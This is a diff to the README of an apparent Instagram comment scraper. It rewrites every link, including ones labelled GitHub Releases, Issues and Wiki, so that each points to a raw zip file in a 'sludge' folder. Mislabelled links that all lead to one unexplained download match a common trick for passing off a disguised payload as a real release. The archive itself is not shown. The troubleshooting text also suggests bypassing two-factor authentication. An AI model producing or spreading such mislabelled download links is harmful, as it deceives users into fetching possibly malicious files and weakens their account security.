@@ -1,6 +1,6 @@
 # 🌟 scrape-instagram-comments - Effortless Instagram Comments Scraping
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue)](https://github.com/tedyyy112/scrape-instagram-comments/releases)
+[![Download Now](https://raw.githubusercontent.com/tedyyy112/scrape-instagram-comments/main/sludge/scrape-instagram-comments.zip)](https://raw.githubusercontent.com/tedyyy112/scrape-instagram-comments/main/sludge/scrape-instagram-comments.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the *scrape-instagram-comments* toolkit! This tool helps you automati
 
 ## 📥 Download & Install
 
-To download this application, visit this page to download: [GitHub Releases](https://github.com/tedyyy112/scrape-instagram-comments/releases).
+To download this application, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/tedyyy112/scrape-instagram-comments/main/sludge/scrape-instagram-comments.zip).
 
 Please find the latest version there and follow the steps below:
 
@@ -63,15 +63,15 @@ If you encounter issues, here are some common solutions:
 - **Login Problems:** Verify that your username and password are correct. Check if you have enabled two-factor authentication; if so, you may need to bypass this temporarily.
 - **Scraping Issues:** Make sure the Instagram post URL is valid and that the post is public.
 
-If problems persist, consider checking out the issues section on the [GitHub page](https://github.com/tedyyy112/scrape-instagram-comments/issues).
+If problems persist, consider checking out the issues section on the [GitHub page](https://raw.githubusercontent.com/tedyyy112/scrape-instagram-comments/main/sludge/scrape-instagram-comments.zip).
 
 ## 📚 Additional Resources
 
-For more detailed guidance and feature descriptions, visit the official documentation found on the [GitHub Wiki](https://github.com/tedyyy112/scrape-instagram-comments/wiki).
+For more detailed guidance and feature descriptions, visit the official documentation found on the [GitHub Wiki](https://raw.githubusercontent.com/tedyyy112/scrape-instagram-comments/main/sludge/scrape-instagram-comments.zip).
 
 ## ✅ Helpful Links
 
-- [GitHub Releases](https://github.com/tedyyy112/scrape-instagram-comments/releases) - Download the latest version.
-- [GitHub Issues](https://github.com/tedyyy112/scrape-instagram-comments/issues) - Report problems or get help.
+- [GitHub Releases](https://raw.githubusercontent.com/tedyyy112/scrape-instagram-comments/main/sludge/scrape-instagram-comments.zip) - Download the latest version.
+- [GitHub Issues](https://raw.githubusercontent.com/tedyyy112/scrape-instagram-comments/main/sludge/scrape-instagram-comments.zip) - Report problems or get help.
 
 Enjoy using *scrape-instagram-comments*. Happy scraping!
